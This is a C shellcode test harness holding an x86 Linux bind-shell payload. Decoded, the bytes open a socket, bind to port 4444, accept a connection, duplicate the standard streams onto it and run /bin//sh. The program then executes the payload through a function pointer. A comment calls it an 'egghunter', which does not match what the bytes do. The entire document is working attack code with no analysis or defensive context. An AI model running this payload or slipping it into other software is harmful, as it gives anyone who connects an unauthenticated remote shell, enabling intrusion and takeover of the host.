#include<stdio.h>
#include<string.h>


unsigned char code[] ="\x31\xd2\x6a\x66\x58\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x52\x66\x68\x11\x5c\x66\x53\x89\xe7\x6a\x10\x57\x56\x89\xe1\xcd\x80\x6a\x66\x58\x31\xdb\xb3\x04\x52\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";




main()
{
	
	
	printf("Shellcode Length:  %d\n", strlen(code));

	//calling egghunter 
	int (*ret)() = (int(*)())code;

	ret();

}
